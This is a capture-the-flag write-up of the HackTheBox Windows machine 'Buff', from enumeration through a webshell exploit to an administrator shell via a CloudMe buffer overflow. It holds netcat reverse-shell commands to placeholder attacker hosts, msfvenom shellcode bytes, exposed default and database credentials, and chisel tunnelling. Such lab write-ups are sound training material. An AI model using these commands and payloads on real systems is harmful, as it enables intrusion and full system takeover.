# HackTheBox: Buff

[Buff](https://app.hackthebox.eu/machines/263) is a Windows-based CTF from HackTheBox. Features some Windows privesc. MetaSploit. BOKU. Chisel.

## Nmap

Found HTTP server on port 8080. Potentially open proxy.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/buff$ cat nmap.txt 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 02:01 BST
Nmap scan report for VICTIM_IP
Host is up (0.077s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.75 seconds
```

## Navigating to HTTP server

HTTP server has a rudimentary web application built.
Focussed on fitness.
Header bar contains 5 pages and a login form.
    
- **Packages**: hints towards `mrb3n` as a username. Copyright `projectworlds.in`, a programming education resource.
- Facilities: general information about offerings
- **About**: hints towards another potential alias variant `mrbe3n`
- Contact: empty, generic contact page

## Testing login form

Hitting login button with no username/password redirects user to `http://VICTIM_IP:8080/index.php?error=1`

I'm not able to manually exploit at this point, however.

## Checking common files

- http://VICTIM_IP:8080/robots.txt
    - Does not exist
- http://VICTIM_IP:8080/sitemap.xml
    - Does not exist

## GoBuster directory enumeration

Need to find more directories, files, .etc.
Run gobuster with seclists' common directories.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/buff$ gobuster dir -u http://VICTIM_IP:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://VICTIM_IP:8080/
[+] Threads:        50
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 02:25:55 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/AT-admin.cgi (Status: 403)
/LICENSE (Status: 200)
/admin.pl (Status: 403)
/admin.cgi (Status: 403)
/aux (Status: 403)
/boot (Status: 301)
/cachemgr.cgi (Status: 403)
/cgi-bin/ (Status: 403)
/com1 (Status: 403)
/com3 (Status: 403)
/com4 (Status: 403)
/com2 (Status: 403)
/con (Status: 403)
/ex (Status: 301)
/include (Status: 301)
/img (Status: 301)
/index.php (Status: 200)
/license (Status: 200)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt2 (Status: 403)
/nul (Status: 403)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/profile (Status: 301)
/server-info (Status: 403)
/server-status (Status: 403)
/showcode.asp (Status: 403)
/upload (Status: 301)
/webalizer (Status: 403)
```

Mostly 403s, but, can access:

- LICENSE: trash 
- **/ex/**: Reveals MySQL error, and directory path. /ex contains more folders.
    ``` 
    Warning: mysqli::__construct(): (HY000/1049): Unknown database 'secure_login' in C:\xampp\htdocs\gym\ex\include\db_connect.php on line 3
    ```
    - /ex/admin
    - /ex/admin/a.php
    - /ex/img
    - /ex/profile
        /ex/profile/i
    - /ex/include
        - /ex/include/process_login.php
        - /ex/include/db_connect.php: database is missing `secure_login`    
- /include: redirects to 403..
- /img: ...
- index.php ... base homepage nothing special
- **/profile**: another broken PHP file 
    ```
     Parse error: syntax error, unexpected '<' in C:\xampp\htdocs\gym\profile\index.php on line 87
    ```
- /upload    
- /webalizer

After rummaging through the outputs, I felt I needed more.

## Running Gobuster with larger directory list

Found:
```
/home.php (Status: 200)
/about.php (Status: 200)
/contact.php (Status: 200)
/index.php (Status: 200)
/register.php (Status: 200)
/feedback.php (Status: 200)
/Home.php (Status: 200)
/upload.php (Status: 200)
/Contact.php (Status: 200)
/About.php (Status: 200)
/Index.php (Status: 200)
/edit.php (Status: 200)
/license (Status: 200)
/up.php (Status: 200)
/packages.php (Status: 200)
```

up.php file returns an error.
```
Notice: Undefined index: name in C:\xampp\htdocs\gym\up.php on line 2
Notice: Undefined index: ext in C:\xampp\htdocs\gym\up.php on line 3
```

register.php has a fake 403 page.

Found some default credentials on &copy; site; https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/

```
Admin Login Details
Login Id: gajen@gmail.com
Password: 12345
```
## Downloaded project used to build site

Following this, I [downloaded the project from the original site](https://goo.gl/aTn1rm), to get a better view of the structure and potential vulnerable files.

Also found some `table.sql` file used to build the tables. This exists on target site too. 

```
$mysql_host = "mysql16.000webhost.com";
$mysql_database = "a8743500_secure";
$mysql_user = "a8743500_secure";
$mysql_password = "ipad12345";
```

As we now have PHP access and get spot a vulnerability we could manually exploit this, but before going on this journey, lets see if a vuln already exists.

## Searching for a known vulnerability

Searchsploit can search known vulns that are already on Kali.
An exploit exists in Python.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/buff$ searchsploit gym management
----------------------------- ---------------------------------
 Exploit Title               |  Path
----------------------------- ---------------------------------
Gym Management System 1.0 -  | php/webapps/48506.py
----------------------------- ---------------------------------
```

## Fixing & using exploit

Open & update Python as required. Exploit attacked the `upload.php` file we found earlier.

Fixed version can be found here: [48506-updated.py](48506-updated.py).
Now works with Python3.

After running we get shell.

```
kali@kali:~/Desktop/repos/ctf/hack-the-box/buff$ python3 48506-updated.py  http://127.0.0.1:8081/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> ls -lah
	PNG
�

C:\xampp\htdocs\gym\upload> whoami
	PNG
�
buff\shaun

```

## Digging into shell

Found user `shaun`. Lets see if we can enumerate more.

Remember that system is Windows-based.

```
C:\xampp\htdocs\gym\upload> dir
�PNG
�
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

26/09/2020  11:45    <DIR>          .
26/09/2020  11:45    <DIR>          ..
26/09/2020  11:45                 0 c.exe
26/09/2020  09:47         8,661,031 esc.exe
26/09/2020  11:45                53 kamehameha.php
26/09/2020  11:34                 0 m.exe
26/09/2020  07:53            59,392 nc.exe
26/09/2020  11:41                 0 r.exe
26/09/2020  11:42                 0 s.exe
26/09/2020  07:45            33,057 winPEAS.bat
26/09/2020  10:52            22,916 winspeas.out.txt
               9 File(s)      8,776,449 bytes
               2 Dir(s)   9,789,427,712 bytes free
```

winPEAS exists. 
Another hacker has been here.

## Read winPEAS output

Read previous winPEAS output in browser, browse to `/upload/winspeas.out.txt`..

Have [added to repo](winpeas.out.txt).

There are numerous processes running at `nt\authority`, '`root`'.

## Getting better shell

In the current directory `C:\xampp\htdocs\gym\upload>` there is a `nc.exe` netcat binary
Use netcat to get powershell.

Listen on attacker machine on 4444.

```
nc -lvp 4444
```

Connect from victim machine and execute powershell on connect.

```
nc ATTACK_IP 4444 -e powershell
```

Then we get powershell.

```
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> 
```

## Get root

### Find exploit

In `shaun`'s `Downloads` folder there's a binary `CloudMe_1112.exe`.

```
PS C:\Users\Shaun\Downloads> ls
ls

    Directory: C:\Users\Shaun\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      
```

A [buffer overflow exploit exists for this](https://www.exploit-db.com/exploits/48389).

### Create a payload for exploit

On attacker machine, generate a payload with `msfvenom`.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/buff$ msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe ATTACKER_IP 4443' -b '\x00\x0a\x0d' -f py -v payload
```

### Update exploit with new payload

Paste output into exploit `/usr/share/exploitdb/exploits/windows/remote/48389.py`, replacing the previous buffer overflow excerpt with the new one. 

The part that looks like this...

```python
# buffer overflow
payload =  b""
payload += b"\xb8\x4b\xfd\x09\x5e\xdb\xd5\xd9\x74\x24\xf4\x5a"
payload += b"\x29\xc9\xb1\x3e\x31\x42\x14\x03\x42\x14\x83\xc2"
payload += b"\x04\xa9\x08\xf5\xb6\xaf\xf3\x06\x47\xcf\x7a\xe3"
payload += b"\x76\xcf\x19\x67\x28\xff\x6a\x25\xc5\x74\x3e\xde"
payload += b"\x5e\xf8\x97\xd1\xd7\xb6\xc1\xdc\xe8\xea\x32\x7e"
payload += b"\x6b\xf0\x66\xa0\x52\x3b\x7b\xa1\x93\x21\x76\xf3"
payload += b"\x4c\x2e\x25\xe4\xf9\x7a\xf6\x8f\xb2\x6b\x7e\x73"
payload += b"\x02\x8a\xaf\x22\x18\xd5\x6f\xc4\xcd\x6e\x26\xde"
payload += b"\x12\x4a\xf0\x55\xe0\x21\x03\xbc\x38\xca\xa8\x81"
payload += b"\xf4\x39\xb0\xc6\x33\xa1\xc7\x3e\x40\x5c\xd0\x84"
payload += b"\x3a\xba\x55\x1f\x9c\x49\xcd\xfb\x1c\x9e\x88\x88"
payload += b"\x13\x6b\xde\xd7\x37\x6a\x33\x6c\x43\xe7\xb2\xa3"
payload += b"\xc5\xb3\x90\x67\x8d\x60\xb8\x3e\x6b\xc7\xc5\x21"
payload += b"\xd4\xb8\x63\x29\xf9\xad\x19\x70\x94\x30\xaf\x0e"
payload += b"\xda\x32\xaf\x10\x4b\x5a\x9e\x9b\x04\x1d\x1f\x4e"
payload += b"\x61\xd1\x55\xd3\xc0\x79\x30\x81\x50\xe4\xc3\x7f"
payload += b"\x96\x10\x40\x8a\x67\xe7\x58\xff\x62\xac\xde\x13"
payload += b"\x1f\xbd\x8a\x13\x8c\xbe\x9e\x57\x08\x1c\x59\x39"
payload += b"\x01\xec\xe9\xe5\xb1\x78\x6e\x79\x21\xf3\x32\xe2"
payload += b"\xdc\x9e\x96\x99\x6e\x0c\x48\x03\xeb\x90\xf8\xa0"
payload += b"\xdd\x4d\x7d\x42\x02\xa0\x18\xac\x21\xd7\x86\x82"
payload += b"\xc0\x5f\x22\xfb\x3b\xaf\x82\xca\x0b\xe1\xeb\x18"
payload += b"\x42\xcf\x3d\x41\xae\x1b\x76\xb2\xce"
```

Note the above msfvenom exploit is with attempt a connection to netcat on 4443. So we need _another_ listener on 4443 for when we execute the buffer overflow.

Run `nc -nlvp 4443` on attacker machine and leave it. Eventually this will be the netcat that gives us root access. 

### Start chisel server on attacker machine

```shell
./chisel server --port 8088 --reverse
```

### Start chisel client on victim with port forward, connect to attacker

```console
./chisel.exe client ATTACKER_IP:8088 R:8888.127.0.0.1:8888
```

### Now ports forwarded, run exploit on attacker

```shell
python /usr/share/exploitdb/exploits/windows/remote/48389.py
```


### Confirm root shell in netcat listening on 44443
```console
kali@kali:~$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [ATTACKER_IP] from (UNKNOWN) [VICTIM_IP] 49730
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```